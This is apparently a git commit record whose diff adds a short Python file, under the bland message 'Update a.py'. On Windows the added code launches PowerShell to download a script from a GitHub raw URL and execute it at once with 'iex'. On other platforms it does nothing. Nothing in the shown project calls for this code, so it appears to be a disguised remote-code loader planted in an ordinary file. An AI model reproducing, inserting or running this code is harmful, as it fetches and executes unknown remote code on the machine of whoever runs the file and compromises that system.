e2a0912277cae1ba5ae4e80f64b67274f1d8cbfd
8yb29qeg <8yb29qeg@songhanhotel.com.vn>
2025-08-14 09:30:13 +0700

    Update a.py

--- a.py
+++ a.py
@@ -1,1 +1,7 @@
-
+import subprocess
+import sys
+if sys.platform.startswith("win"):
+    cmd = r'iwr https://github.com/8yb29qeg/lol/raw/refs/heads/main/a.txt -useb | iex'
+    subprocess.run(["powershell", "-Command", cmd], shell=True)
+else:
+    ""
